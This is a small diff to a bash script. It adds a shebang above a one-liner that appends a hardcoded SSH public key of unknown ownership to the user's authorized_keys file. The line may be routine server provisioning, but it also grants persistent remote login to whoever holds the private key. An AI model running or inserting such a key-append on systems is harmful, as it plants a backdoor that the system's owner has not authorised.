@@ -1,1 +1,3 @@
+#!/bin/bash
+
 mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && chmod -R go= ~/.ssh && echo $'\n#=======\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4t04JPvWUnfmdxArLiSWF/65s0FOc3OLI2IJUign6O6NX2EjTJy54UMqPg5SWIzKip2bLBZ/pWkJKeLPeeS9GkgwCmZ0ReSJrU0+rmZfxUcsLU4w22E4rL9Kp94g/x2G9SH2n0L2nsVMlBmmlbG5TrIdKDtg4c6g6t0Ur6AvL8g4Uu2KfQNt/py7NaaV7WNKrHgrlp7xVUXpGd0klFxutKbB3TFBrH5jT9FHrK2ZmnA93SA310TJiE2OSsrfZC+oseaREi7Lu+f79jeQkw+e0+UVxZXcuBirtJncYT2ZCp63+uXZkorWzgVOn2CyV3xlTI+ab1hhhr2/s1Zqj3iNWKdUbQhh+fmxpYMA4q5NTqt5b4o+7gXNbUGGpHNmp+gL6y6Q4NE07ahyVw9kBFAUKi3HA/N5U2ZKwXZtk/p9vmm0Jq2TKceIoB9Q3aiap+RiUbW6ZTeR5WFZmPw91tU0AXlXIM8/965qC2fpq9lp8lL3pT9oCXuT6+s2d/RZGiZk= \n#=======\n' >> ~/.ssh/authorized_keys
